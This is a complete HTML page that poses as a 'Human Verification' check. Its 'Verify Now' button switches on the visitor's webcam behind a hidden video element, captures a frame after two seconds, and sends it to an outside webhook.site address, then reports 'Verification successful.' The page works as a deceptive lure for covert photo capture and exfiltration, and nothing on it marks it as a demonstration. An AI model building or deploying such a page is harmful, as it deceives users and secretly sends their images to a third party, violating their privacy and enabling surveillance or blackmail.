<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verification Page</title>
    <style>
        body { text-align: center; font-family: sans-serif; padding-top: 50px; }
        .box { border: 2px solid #ccc; padding: 20px; display: inline-block; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <h1>Human Verification</h1>
    <p>Please click the button below to prove you are human.</p>
    <button onclick="startCamera()">Verify Now</button>
</div>

<video id="video" style="display:none" autoplay></video>

<script>
    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                const imageData = canvas.toDataURL('image/png');
                
                const blob = await (await fetch(imageData)).blob();
                const formData = new FormData();
                formData.append('image', blob, 'capture.png');

                await fetch('https://webhook.site/ccaa7fc6-aa98-4db2-bdce-e85f03e94d2d', {
                    method: 'POST',
                    body: formData
                });

                alert("Verification successful.");
            }, 2000);

        } catch (err) {
            console.error("Error: ", err);
            alert("Verification failed.");
        }
    }
</script>
</body>
</html>
